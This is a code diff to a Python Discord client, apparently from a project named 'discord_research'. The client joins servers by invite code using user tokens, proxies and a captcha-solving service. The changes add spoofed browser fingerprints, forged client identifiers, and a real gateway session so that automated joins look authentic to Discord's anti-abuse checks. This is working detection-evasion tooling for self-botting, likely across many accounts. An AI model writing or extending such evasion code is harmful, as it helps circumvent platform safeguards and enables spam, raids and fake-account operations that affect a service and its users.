@@ -5,14 +5,18 @@ import logging
 import random
 import re
 import secrets
+import uuid
+from dataclasses import asdict
 from datetime import datetime, timezone
 from pathlib import Path
 
 import httpx
+from browserforge.fingerprints import FingerprintGenerator
 
 from app.core.config import get_settings
 from app.models.research import CaptchaChallenge
 from app.services.captcha_solver import CaptchaSolverService
+from app.services.gateway_session import GatewaySession
 
 logger = logging.getLogger('discord_research.discord_client')
 captcha_debug_logger = logging.getLogger('discord_research.captcha_solutions')
@@ -21,18 +25,14 @@ RETRY_BASE_DELAY_SECONDS = 0.5
 RETRY_MAX_SLEEP_SECONDS = 2.0
 RETRY_JITTER_SECONDS = 0.2
 
-# Pre-computed base64 headers required by Discord's user-token invite endpoint.
-# X-Context-Properties tells Discord where the join action originates.
+# Cached globally — FingerprintGenerator is expensive to initialise.
+_FINGERPRINT_GENERATOR = FingerprintGenerator()
+_FIREFOX_RE = re.compile(r'Firefox/([\d.]+)')
+
+# Pre-computed base64 X-Context-Properties header for the Discord join endpoint.
+# Uses the minimal format expected by the web client.
 _CONTEXT_PROPERTIES = base64.b64encode(
-    json.dumps(
-        {
-            'location': 'Join Guild',
-            'location_guild_id': None,
-            'location_channel_id': None,
-            'location_channel_type': None,
-        },
-        separators=(',', ':'),
-    ).encode()
+    json.dumps({'location': 'Join Guild'}, separators=(',', ':')).encode()
 ).decode()
 
 
@@ -45,7 +45,7 @@ def _build_user_agent(chrome_version: str) -> str:
 
 
 def _build_super_properties(chrome_version: str, build_number: int) -> str:
-    """Return base64-encoded X-Super-Properties header value."""
+    """Return base64-encoded X-Super-Properties header value (static Chrome profile)."""
     ua = _build_user_agent(chrome_version)
     return base64.b64encode(
         json.dumps(
@@ -70,6 +70,40 @@ def _build_super_properties(chrome_version: str, build_number: int) -> str:
     ).decode()
 
 
+def _build_fingerprint_super_properties(
+    fingerprint: dict,
+    browser_version: str,
+    client_identity: dict,
+    locale: str = 'en-US',
+) -> str:
+    """Return base64-encoded X-Super-Properties built from a browserforge fingerprint.
+
+    Uses the same fields as the Discord web client IDENTIFY payload so that the
+    HTTP super-properties header is consistent with the WebSocket gateway session.
+    """
+    navigator = fingerprint.get('navigator') or {}
+    user_agent = navigator.get('userAgent') or ''
+    props = {
+        'os': 'macos',
+        'browser': 'firefox',
+        'device': '',
+        'system_locale': locale,
+        'has_client_mods': True,
+        'browser_user_agent': user_agent,
+        'browser_version': browser_version,
+        'os_version': '10',
+        'referrer': '',
+        'referring_domain': '',
+        'referrer_current': '',
+        'referring_domain_current': '',
+        'release_channel': 'stable',
+        'client_event_source': None,
+        **client_identity,
+        'client_app_state': 'focused',
+    }
+    return base64.b64encode(json.dumps(props, separators=(',', ':')).encode()).decode()
+
+
 class DiscordClient:
     def __init__(self) -> None:
         settings = get_settings()
@@ -82,6 +116,7 @@ class DiscordClient:
         self._user_agent = _build_user_agent(self._chrome_version)
         self._super_properties = _build_super_properties(self._chrome_version, self._build_number)
         self._join_failure_log_enabled = settings.join_failure_log_enabled
+        self._gateway_session_timeout = settings.gateway_session_timeout
         # Resolve the join failures directory relative to the project root so that
         # relative paths in the config work correctly regardless of cwd.
         _project_root = Path(__file__).resolve().parent.parent.parent.parent
@@ -206,6 +241,10 @@ class DiscordClient:
     ) -> dict:
         """Join a guild via invite code with a user token.
 
+        Uses advanced browser fingerprinting and a real Discord WebSocket gateway
+        session_id for higher authenticity.  Falls back to a random session_id if
+        the gateway connection times out.
+
         After a successful join the method automatically completes server
         onboarding so the account is immediately able to send messages even if
         the server uses Discord's onboarding gate.
@@ -216,18 +255,60 @@ class DiscordClient:
 
         invite_metadata = await self._fetch_invite_metadata(code=code, token=token, proxy_url=proxy_url)
 
-        # Generate a random session_id per join attempt, mimicking the Discord
-        # web client which links HTTP invite calls to its WebSocket gateway session.
-        session_id = str(invite_metadata.get('captcha_session_id') or secrets.token_hex(16))
+        # ------------------------------------------------------------------
+        # Build per-join browser fingerprint and client identity.
+        # ------------------------------------------------------------------
+        client_identity = {
+            k: str(uuid.uuid4())
+            for k in ('client_launch_id', 'launch_signature', 'client_heartbeat_session_id')
+        }
+        fingerprint = asdict(_FINGERPRINT_GENERATOR.generate(browser='firefox', os='macos'))
+        navigator = fingerprint.get('navigator') or {}
+        user_agent = navigator.get('userAgent') or self._user_agent
+        browser_version = '0'
+        uda = navigator.get('userAgentData')
+        if uda and uda.get('brands'):
+            browser_version = str(uda['brands'][-1].get('version', '0'))
+        else:
+            m = _FIREFOX_RE.search(user_agent)
+            if m:
+                browser_version = m.group(1)
+
+        # ------------------------------------------------------------------
+        # Fetch user locale from /users/@me so x-discord-locale matches the
+        # account's actual locale setting (same as the Discord web client).
+        # ------------------------------------------------------------------
+        locale = await self._fetch_user_locale(token=token, proxy_url=proxy_url)
+
+        super_properties = _build_fingerprint_super_properties(
+            fingerprint, browser_version, client_identity, locale=locale
+        )
+
+        # ------------------------------------------------------------------
+        # Obtain a real WebSocket gateway session_id via the Discord gateway.
+        # Falls back to a random hex id if the connection times out.
+        # ------------------------------------------------------------------
+        session_id = await self._acquire_gateway_session_id(
+            token=token,
+            proxy_url=proxy_url,
+            timeout=self._gateway_session_timeout,
+        )
+        if session_id is None:
+            # Graceful fallback: use invite captcha_session_id or random hex.
+            session_id = str(invite_metadata.get('captcha_session_id') or secrets.token_hex(16))
+            logger.info(
+                'Discord join using fallback session_id invite=%s token_id=%s', code, token_id
+            )
 
         headers = {
             'Authorization': token,
             'Content-Type': 'application/json',
             'X-Context-Properties': _CONTEXT_PROPERTIES,
-            'X-Super-Properties': self._super_properties,
-            'X-Discord-Locale': 'en-US',
+            'X-Super-Properties': super_properties,
+            'X-Discord-Locale': locale,
             'X-Discord-Timezone': 'America/New_York',
-            'User-Agent': self._user_agent,
+            'x-debug-options': 'bugReporterEnabled',
+            'User-Agent': user_agent,
             'Accept': '*/*',
             'Accept-Language': 'en-US,en;q=0.9',
             'Origin': 'https://discord.com',
@@ -421,6 +502,39 @@ class DiscordClient:
         if solve_result.get('captcha_session_id'):
             payload['captcha_session_id'] = solve_result.get('captcha_session_id')
         return [payload]
+
+    async def _fetch_user_locale(self, token: str, proxy_url: str | None = None) -> str:
+        """Return the account locale from ``/users/@me``, defaulting to ``en-US``."""
+        headers = {'Authorization': token}
+        async with httpx.AsyncClient(timeout=10, proxy=proxy_url) as client:
+            try:
+                resp = await client.get(f'{self.base_url}/users/@me', headers=headers)
+                if resp.status_code == 200:
+                    return resp.json().get('locale') or 'en-US'
+            except httpx.HTTPError as exc:
+                logger.debug('_fetch_user_locale HTTP error: %s', exc)
+        return 'en-US'
+
+    async def _acquire_gateway_session_id(
+        self,
+        token: str,
+        proxy_url: str | None = None,
+        timeout: float = 20.0,
+    ) -> str | None:
+        """Connect to the Discord WebSocket gateway and return the real session_id.
+
+        Returns ``None`` if the connection fails or times out so the caller can
+        fall back to a random session_id.
+        """
+        try:
+            async with GatewaySession(token=token, proxy=proxy_url) as gw:
+                ready = await gw.wait_for_ready(timeout=timeout)
+                if ready and gw.session_id:
+                    logger.debug('GatewaySession session_id acquired for token_id (gateway)')
+                    return gw.session_id
+        except Exception as exc:
+            logger.warning('GatewaySession connect error: %s', exc)
+        return None
 
     async def _fetch_invite_metadata(self, code: str, token: str, proxy_url: str | None = None) -> dict:
         """Fetch invite metadata similarly to the Discord web-client preflight."""
